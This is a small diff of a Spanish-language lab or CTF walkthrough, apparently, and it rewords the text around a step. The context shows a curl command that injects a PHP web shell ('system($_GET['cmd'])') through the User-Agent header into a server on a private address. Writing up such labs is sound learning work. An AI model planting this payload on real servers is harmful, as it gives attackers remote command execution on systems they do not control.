@@ -136,7 +136,7 @@ curl -A "hola que tal" "http://192.168.1.46/"
 ![TECH](images/tech/15.png)
 
 
-esto pinta bien, ahora vamos a lanzar un cmd para poder ejecutar comandos:
+esto pinta bien, ahora vamos a lanzar un cmd para ver si se ejecuta php y lo refleja
 
 ```bash
 curl -A "<?php system(\$_GET['cmd']); ?>" "http://192.168.1.46/"
